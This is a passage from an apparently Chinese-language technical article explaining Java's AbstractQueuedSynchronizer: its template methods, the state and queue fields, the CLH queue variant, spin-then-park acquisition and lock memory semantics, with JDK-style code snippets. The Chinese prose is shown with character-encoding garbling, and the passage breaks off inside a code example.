AQSçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>å¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºç©ºé—²ï¼Œåˆ™å°†å½“å‰è¯·æ±‚èµ„æºçš„çº¿ç¨‹è®¾ç½®ä¸ºæœ‰æ•ˆå·¥ä½œçº¿ç¨‹ï¼Œå¹¶å°†å…±äº«èµ„æºè®¾ç½®ä¸ºé”å®šçŠ¶æ€ï¼›å¦‚æœè¢«è¯·æ±‚çš„å…±äº«èµ„æºè¢«å ç”¨ï¼Œå°±éœ€è¦ä¸€å¥—çº¿ç¨‹é˜»å¡ç­‰å¾…ä»¥åŠè¢«å”¤é†’æ—¶é”åˆ†é…çš„æœºåˆ¶ï¼ŒAQSä½¿ç”¨CLHé˜Ÿåˆ—é”çš„å˜ä½“æ¥å®ç°è¿™ä¸€æœºåˆ¶ã€‚</strong></p>
<h4 data-id="heading-34">1.2 æ¨¡æ¿æ–¹æ³•æ¨¡å¼</h4>
<p>AQSé‡‡ç”¨<strong>æ¨¡æ¿æ–¹æ³•è®¾è®¡æ¨¡å¼</strong>ï¼šå°†é€šç”¨çš„æµç¨‹å°è£…åœ¨çˆ¶ç±»ä¸­ï¼Œå°†å¯å˜çš„éƒ¨åˆ†ç•™ç»™å­ç±»å®ç°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSå®šä¹‰çš„æ¨¡æ¿æ–¹æ³•ï¼ˆfinalï¼Œä¸å¯é‡å†™ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;           <span class="hljs-comment">// â‘  å­ç±»å®ç°ï¼šå°è¯•è·å–é”</span>
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))  <span class="hljs-comment">// â‘¡ AQSå®ç°ï¼šå…¥é˜Ÿç­‰å¾…</span>
        selfInterrupt();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {            <span class="hljs-comment">// â‘  å­ç±»å®ç°ï¼šå°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);       <span class="hljs-comment">// â‘¡ AQSå®ç°ï¼šå”¤é†’åç»§</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>å­ç±»éœ€è¦å®ç°çš„æ–¹æ³•</strong>ï¼š</p>



































<table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th><th align="left">ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><code>tryAcquire(int)</code></td><td align="left">å°è¯•ç‹¬å è·å–</td><td align="left">ReentrantLock</td></tr><tr><td align="left"><code>tryRelease(int)</code></td><td align="left">å°è¯•ç‹¬å é‡Šæ”¾</td><td align="left">ReentrantLock</td></tr><tr><td align="left"><code>tryAcquireShared(int)</code></td><td align="left">å°è¯•å…±äº«è·å–</td><td align="left">Semaphoreã€CountDownLatch</td></tr><tr><td align="left"><code>tryReleaseShared(int)</code></td><td align="left">å°è¯•å…±äº«é‡Šæ”¾</td><td align="left">Semaphoreã€CountDownLatch</td></tr><tr><td align="left"><code>isHeldExclusively()</code></td><td align="left">æ˜¯å¦ç‹¬å æŒæœ‰</td><td align="left">Conditionä½¿ç”¨</td></tr></tbody></table>
<h4 data-id="heading-35">1.3 ä¸¤ç§èµ„æºå…±äº«æ¨¡å¼</h4>
<p>AQSæ”¯æŒä¸¤ç§èµ„æºå…±äº«æ¨¡å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67b55717cf4c4c1b97c5a07a07f272ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=w7fsfks7jJ1iZdNy%2Fr2XXeeKJ8U%3D" alt="exclusive-vs-shared.drawio.png" loading="lazy"/>
<strong>ç‹¬å æ¨¡å¼ï¼ˆExclusiveï¼‰</strong>ï¼š</p>
<ul>
<li>åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–èµ„æº</li>
<li>ä¾‹å¦‚ï¼šReentrantLock</li>
</ul>
<p><strong>å…±äº«æ¨¡å¼ï¼ˆSharedï¼‰</strong>ï¼š</p>
<ul>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–èµ„æº</li>
<li>ä¾‹å¦‚ï¼šSemaphoreï¼ˆä¿¡å·é‡ï¼‰ã€CountDownLatchã€ReadWriteLockçš„è¯»é”</li>
</ul>
<hr/>
<h3 data-id="heading-36">2. æ ¸å¿ƒå­—æ®µè§£æ</h3>
<h4 data-id="heading-37">2.1 stateå­—æ®µ</h4>
<p><code>state</code>æ˜¯AQSä¸­æœ€æ ¸å¿ƒçš„å­—æ®µï¼Œè¡¨ç¤ºåŒæ­¥çŠ¶æ€ã€‚å®ƒçš„å«ä¹‰ç”±å…·ä½“çš„åŒæ­¥å™¨å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * The synchronization state.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state;

<span class="hljs-comment">// è·å–çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> state;
}

<span class="hljs-comment">// è®¾ç½®çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;
}

<span class="hljs-comment">// CASè®¾ç½®çŠ¶æ€</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}
</code></pre>
<p><strong>ä¸åŒåŒæ­¥å™¨ä¸­stateçš„å«ä¹‰</strong>ï¼š</p>

























<table><thead><tr><th align="left">åŒæ­¥å™¨</th><th align="left">stateå«ä¹‰</th></tr></thead><tbody><tr><td align="left">ReentrantLock</td><td align="left">0=æœªé”å®šï¼Œ&gt;0=é”å®šï¼ˆå€¼è¡¨ç¤ºé‡å…¥æ¬¡æ•°ï¼‰</td></tr><tr><td align="left">ReentrantReadWriteLock</td><td align="left">é«˜16ä½=è¯»é”æ•°é‡ï¼Œä½16ä½=å†™é”é‡å…¥æ¬¡æ•°</td></tr><tr><td align="left">Semaphore</td><td align="left">å¯ç”¨è®¸å¯æ•°é‡</td></tr><tr><td align="left">CountDownLatch</td><td align="left">å‰©ä½™è®¡æ•°</td></tr></tbody></table>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockä¸­stateçš„ä½¿ç”¨
 */</span>
<span class="hljs-comment">// è·å–é”æ—¶</span>
<span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {  <span class="hljs-comment">// 0 -&gt; 1ï¼Œè·å–æˆåŠŸ</span>
    setExclusiveOwnerThread(current);
}

<span class="hljs-comment">// é‡å…¥æ—¶</span>
<span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;  <span class="hljs-comment">// stateé€’å¢</span>
setState(nextc);

<span class="hljs-comment">// é‡Šæ”¾é”æ—¶</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// stateé€’å‡</span>
<span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
    setExclusiveOwnerThread(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// å®Œå…¨é‡Šæ”¾</span>
}
setState(c);
</code></pre>
<h4 data-id="heading-38">2.2 headå’Œtailå­—æ®µ</h4>
<p>AQSä½¿ç”¨ä¸€ä¸ªFIFOåŒå‘é˜Ÿåˆ—æ¥ç®¡ç†ç­‰å¾…çº¿ç¨‹ã€‚<code>head</code>å’Œ<code>tail</code>åˆ†åˆ«æŒ‡å‘é˜Ÿåˆ—çš„å¤´éƒ¨å’Œå°¾éƒ¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Head of the wait queue, lazily initialized.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node head;

<span class="hljs-comment">/**
 * Tail of the wait queue, lazily initialized.
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Node tail;
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10a561a5c17f44b291966b2f12a07889~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=nDN31yMMy8rMaHDTqUIbXgv9Wog%3D" alt="clh-queue.drawio.png" loading="lazy"/></p>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>æ‡’åˆå§‹åŒ–</strong>ï¼šåªæœ‰åœ¨å‘ç”Ÿç«äº‰æ—¶æ‰ä¼šåˆå§‹åŒ–é˜Ÿåˆ—</li>
<li><strong>headæ˜¯å“¨å…µèŠ‚ç‚¹</strong>ï¼šä¸å­˜å‚¨å®é™…çš„ç­‰å¾…çº¿ç¨‹ï¼Œç®€åŒ–è¾¹ç•Œå¤„ç†</li>
<li><strong>åŒå‘é“¾è¡¨</strong>ï¼šä¾¿äºèŠ‚ç‚¹çš„å–æ¶ˆå’Œè¶…æ—¶å¤„ç†</li>
</ul>
<h4 data-id="heading-39">2.3 exclusiveOwnerThreadå­—æ®µ</h4>
<p>è¯¥å­—æ®µç»§æ‰¿è‡ª<code>AbstractOwnableSynchronizer</code>ï¼Œè®°å½•å½“å‰æŒæœ‰ç‹¬å é”çš„çº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AbstractOwnableSynchronizer.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractOwnableSynchronizer</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Thread exclusiveOwnerThread;
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setExclusiveOwnerThread</span><span class="hljs-params">(Thread thread)</span> {
        exclusiveOwnerThread = thread;
    }
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getExclusiveOwnerThread</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> exclusiveOwnerThread;
    }
}
</code></pre>
<p>è¿™ä¸ªå­—æ®µç”¨äºï¼š</p>
<ol>
<li><strong>å¯é‡å…¥åˆ¤æ–­</strong>ï¼šæ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦å·²ç»æŒæœ‰é”</li>
<li><strong>é”çŠ¶æ€æŸ¥è¯¢</strong>ï¼šè·å–é”çš„æŒæœ‰è€…</li>
</ol>
<hr/>
<h3 data-id="heading-40">3. CLHé˜Ÿåˆ—å˜ä½“</h3>
<h4 data-id="heading-41">3.1 ç»å…¸CLHé˜Ÿåˆ—</h4>
<p>CLHï¼ˆCraig, Landin, and Hagerstenï¼‰é˜Ÿåˆ—æ˜¯ä¸€ç§åŸºäºé“¾è¡¨çš„è‡ªæ—‹é”ï¼Œæ¯ä¸ªçº¿ç¨‹åœ¨å‰é©±èŠ‚ç‚¹ä¸Šè‡ªæ—‹ç­‰å¾…ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07afc1061001438fb7c26bca1482ac29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=3Bq41SIt6fDTI4ds2Wirw4MZBmw%3D" alt="classic-clh-queue.drawio.png" loading="lazy"/>
<strong>ç»å…¸CLHç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹åªæœ‰ä¸€ä¸ª<code>locked</code>æ ‡å¿—</li>
<li>åç»§èŠ‚ç‚¹åœ¨å‰é©±çš„<code>locked</code>ä¸Šè‡ªæ—‹</li>
<li>é‡Šæ”¾é”æ—¶ï¼Œåªéœ€è®¾ç½®è‡ªå·±çš„<code>locked=false</code></li>
</ul>
<h4 data-id="heading-42">3.2 AQSçš„CLHå˜ä½“</h4>
<p>AQSå¯¹CLHé˜Ÿåˆ—è¿›è¡Œäº†æ”¹é€ ï¼Œä¸»è¦åŒºåˆ«ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ca10e89f67e4193bac990f2198c913e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=xOefZhfaFSiKVO%2FYEjE2rJeWcNc%3D" alt="aqs-clh-variant.drawio.png" loading="lazy"/>
<strong>ä¸»è¦æ”¹è¿›</strong>ï¼š</p>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ç»å…¸CLH</th><th align="left">AQS CLHå˜ä½“</th></tr></thead><tbody><tr><td align="left">é“¾è¡¨æ–¹å‘</td><td align="left">å•å‘ï¼ˆéšå¼ï¼‰</td><td align="left">åŒå‘ï¼ˆæ˜¾å¼prev/nextï¼‰</td></tr><tr><td align="left">ç­‰å¾…æ–¹å¼</td><td align="left">è‡ªæ—‹</td><td align="left">park/unparké˜»å¡</td></tr><tr><td align="left">èŠ‚ç‚¹çŠ¶æ€</td><td align="left">ç®€å•locked</td><td align="left">å¤šç§waitStatus</td></tr><tr><td align="left">å–æ¶ˆæ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒï¼ˆCANCELLEDçŠ¶æ€ï¼‰</td></tr><tr><td align="left">è¶…æ—¶æ”¯æŒ</td><td align="left">ä¸æ”¯æŒ</td><td align="left">æ”¯æŒ</td></tr></tbody></table>
<h4 data-id="heading-43">3.3 ä¸ºä»€ä¹ˆä½¿ç”¨åŒå‘é“¾è¡¨</h4>
<p><strong>å•å‘é“¾è¡¨çš„é—®é¢˜</strong>ï¼š</p>
<ol>
<li>å–æ¶ˆèŠ‚ç‚¹æ—¶ï¼Œæ— æ³•å¿«é€Ÿæ‰¾åˆ°å‰é©±æ¥ä¿®æ”¹nextæŒ‡é’ˆ</li>
<li>è¶…æ—¶/ä¸­æ–­æ—¶éœ€è¦ä»å¤´éå†</li>
</ol>
<p><strong>åŒå‘é“¾è¡¨çš„ä¼˜åŠ¿</strong>ï¼š</p>
<ol>
<li>O(1)æ—¶é—´æ‰¾åˆ°å‰é©±èŠ‚ç‚¹</li>
<li>ä¾¿äºå®ç°å–æ¶ˆå’Œè¶…æ—¶é€»è¾‘</li>
<li>å”¤é†’åç»§æ—¶æ›´é«˜æ•ˆ</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å–æ¶ˆèŠ‚ç‚¹æ—¶éœ€è¦æ‰¾åˆ°æœ‰æ•ˆå‰é©±</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelAcquire</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-comment">// ...</span>
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> node.prev;
    <span class="hljs-keyword">while</span> (pred.waitStatus &gt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// è·³è¿‡å·²å–æ¶ˆçš„å‰é©±</span>
        node.prev = pred = pred.prev;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-44">3.4 è‡ªæ—‹é”ä¸AQSçš„è‡ªæ—‹æœºåˆ¶</h4>
<p><strong>ä»€ä¹ˆæ˜¯è‡ªæ—‹é”ï¼Ÿ</strong></p>
<p>è‡ªæ—‹é”æ˜¯ä¸€ç§å¿™ç­‰å¾…é”ï¼Œçº¿ç¨‹åœ¨è·å–é”å¤±è´¥æ—¶ä¸ä¼šç«‹å³é˜»å¡ï¼Œè€Œæ˜¯åœ¨å¾ªç¯ä¸­ä¸æ–­å°è¯•è·å–é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç®€å•è‡ªæ—‹é”ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleSpinLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è‡ªæ—‹ï¼šä¸æ–­å°è¯•ï¼Œç›´åˆ°æˆåŠŸ</span>
        <span class="hljs-keyword">while</span> (!locked.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>)) {
            <span class="hljs-comment">// è‡ªæ—‹ç­‰å¾…ï¼Œæ¶ˆè€—CPU</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> {
        locked.set(<span class="hljs-literal">false</span>);
    }
}
</code></pre>
<p><strong>è‡ªæ—‹çš„ä¼˜ç¼ºç‚¹</strong>ï¼š</p>

























<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">CPUä½¿ç”¨</td><td align="left">æ— ä¸Šä¸‹æ–‡åˆ‡æ¢</td><td align="left">æŒç»­æ¶ˆè€—CPU</td></tr><tr><td align="left">å»¶è¿Ÿ</td><td align="left">é”é‡Šæ”¾åç«‹å³è·å–</td><td align="left">é•¿æ—¶é—´ç­‰å¾…æµªè´¹CPU</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">é”æŒæœ‰æ—¶é—´çŸ­</td><td align="left">é”æŒæœ‰æ—¶é—´é•¿æ—¶æ•ˆç‡ä½</td></tr></tbody></table>
<p><strong>AQSä¸­çš„è‡ªæ—‹æœºåˆ¶</strong>ï¼š</p>
<p>AQS<strong>å¹¶éçº¯è‡ªæ—‹é”</strong>ï¼Œè€Œæ˜¯é‡‡ç”¨<strong>è‡ªæ—‹+é˜»å¡</strong>çš„æ··åˆç­–ç•¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * acquireQueuedä¸­çš„è‡ªæ—‹é€»è¾‘
 * å…³é”®ï¼šä¸æ˜¯ä¸€ç›´è‡ªæ—‹ï¼Œè€Œæ˜¯æœ‰æ¡ä»¶åœ°è‡ªæ—‹
 */</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {  <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ª"è‡ªæ—‹"å¾ªç¯</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// ã€è‡ªæ—‹å°è¯•1ã€‘åªæœ‰å‰é©±æ˜¯headæ—¶æ‰å°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>;
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// ã€å…³é”®ã€‘ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œä¸æ˜¯ç»§ç»­è‡ªæ—‹ï¼Œè€Œæ˜¯parké˜»å¡ï¼</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<p><strong>AQSè‡ªæ—‹ç­–ç•¥çš„ç²¾å¦™ä¹‹å¤„</strong>ï¼š</p>
<ol>
<li><strong>æœ‰é™è‡ªæ—‹</strong>ï¼šåªæœ‰å‰é©±æ˜¯headï¼ˆå³é©¬ä¸Šè½®åˆ°è‡ªå·±ï¼‰æ—¶æ‰è‡ªæ—‹å°è¯•</li>
<li><strong>å¿«é€Ÿé˜»å¡</strong>ï¼šå…¶ä»–æƒ…å†µç›´æ¥parké˜»å¡ï¼Œé¿å…CPUç©ºè½¬</li>
<li><strong>å”¤é†’åè‡ªæ—‹</strong>ï¼šè¢«unparkå”¤é†’åï¼Œå†æ¬¡è¿›å…¥å¾ªç¯å°è¯•</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸ºä»€ä¹ˆè¦åœ¨parkå‰å†è‡ªæ—‹ä¸€æ¬¡ï¼Ÿ</span>
<span class="hljs-comment">// å› ä¸ºåœ¨è®¾ç½®SIGNALå’Œparkä¹‹é—´ï¼Œé”å¯èƒ½å·²ç»é‡Šæ”¾äº†</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldParkAfterFailedAcquire</span><span class="hljs-params">(Node pred, Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> pred.waitStatus;
    <span class="hljs-keyword">if</span> (ws == Node.SIGNAL)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å¯ä»¥å®‰å…¨é˜»å¡</span>
    <span class="hljs-comment">// ... è®¾ç½®SIGNAL</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿”å›falseï¼Œå¤–å±‚å¾ªç¯ä¼šå†å°è¯•ä¸€æ¬¡acquireï¼</span>
}
</code></pre>
<h4 data-id="heading-45">3.5 é”çš„å†…å­˜è¯­ä¹‰</h4>
<p>ä» JMM çš„è§’åº¦çœ‹ï¼Œé”æ—¢æä¾›äº’æ–¥ï¼Œä¹Ÿæä¾›å†…å­˜å¯è§æ€§ä¿éšœã€‚å…·ä½“æ¥è¯´ï¼š<strong>å¯¹åŒä¸€æŠŠé”çš„é‡Šæ”¾ä¸è·å–ä¹‹é—´å­˜åœ¨â€œhappens-beforeâ€ å…³ç³»</strong>ã€‚ä¸€ä¸ªçº¿ç¨‹åœ¨é‡Šæ”¾é”æ—¶ï¼Œä¼šæŠŠä¸´ç•ŒåŒºä¸­çš„æ‰€æœ‰å†™æ“ä½œåˆ·å›ä¸»å†…å­˜ï¼ˆç±»ä¼¼äºå¯¹ volatile å˜é‡çš„å†™ï¼‰ï¼›å¦ä¸€ä¸ªçº¿ç¨‹ä¹‹åè·å–åŒä¸€æŠŠé”æ—¶ï¼Œå¿…é¡»ä»ä¸»å†…å­˜ä¸­é‡æ–°è¯»å–è¿™äº›å˜é‡ï¼Œä»è€Œçœ‹åˆ°ä¹‹å‰çº¿ç¨‹çš„ä¿®æ”¹ï¼Œè¿™ç±»ä¼¼äºå¯¹ volatile å˜é‡çš„è¯»ã€‚</p>
<p>åœ¨ ReentrantLock å†…éƒ¨ï¼Œè¿™ç§è¯­ä¹‰æ˜¯é€šè¿‡ AQS çš„ <code>state</code> å­—æ®µï¼ˆvolatileï¼‰å’Œ CAS æ“ä½œå®ç°çš„ï¼šè·å–é”ä½¿ç”¨ CAS ä¿®æ”¹ stateï¼Œç›¸å½“äºä¸€æ¬¡â€œvolatile è¯» + volatile å†™â€ï¼›é‡Šæ”¾é”ä½¿ç”¨å¯¹ state çš„æ™®é€šå†™ï¼Œä½† state æœ¬èº«æ˜¯ volatile å˜é‡ï¼Œè¿™ä¼šæŠŠä¹‹å‰çš„ä¿®æ”¹åˆ·æ–°åˆ°ä¸»å†…å­˜ã€‚è¿™æ ·ï¼Œä¸´ç•ŒåŒºå†…çš„æ‰€æœ‰æ™®é€šå†™åœ¨é‡Šæ”¾é”åï¼Œå¯¹åç»­è·å–åŒä¸€æŠŠé”çš„çº¿ç¨‹éƒ½æ˜¯å¯è§çš„ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆç†è§£å†…å­˜è¯­ä¹‰å¾ˆé‡è¦ï¼Ÿ</strong></p>
<p>é”ä¸ä»…æä¾›äº’æ–¥ï¼Œè¿˜æä¾›<strong>å†…å­˜å¯è§æ€§</strong>ä¿è¯ã€‚è¿™æ˜¯å¾ˆå¤šå¼€å‘è€…å¿½ç•¥çš„å…³é”®ç‚¹ã€‚</p>
<p><strong>é”çš„å†…å­˜è¯­ä¹‰</strong>ï¼š</p>
<ol>
<li><strong>è·å–é”</strong>ï¼šç›¸å½“äºè¯»å–volatileå˜é‡ï¼Œä¼šæ¸…ç©ºæœ¬åœ°ç¼“å­˜ï¼Œä»ä¸»å†…å­˜é‡æ–°è¯»å–</li>
<li><strong>é‡Šæ”¾é”</strong>ï¼šç›¸å½“äºå†™å…¥volatileå˜é‡ï¼Œä¼šå°†æœ¬åœ°ç¼“å­˜åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”çš„å†…å­˜è¯­ä¹‰ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockMemorySemantics</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”ï¼šåç»­è¯»æ“ä½œä¸ä¼šé‡æ’åºåˆ°è¿™ä¹‹å‰</span>
        <span class="hljs-keyword">try</span> {
            x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// è¿™äº›å†™å…¥åœ¨é‡Šæ”¾é”æ—¶ä¼šåˆ·æ–°åˆ°ä¸»å†…å­˜</span>
            y = <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼šä¹‹å‰çš„å†™æ“ä½œå¯¹å…¶ä»–çº¿ç¨‹å¯è§</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”ï¼šä¼šçœ‹åˆ°é‡Šæ”¾é”ä¹‹å‰çš„æ‰€æœ‰å†™å…¥</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è¿™é‡Œä¸€å®šèƒ½çœ‹åˆ° x=1, y=2</span>
            System.out.println(x + <span class="hljs-string">", "</span> + y);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
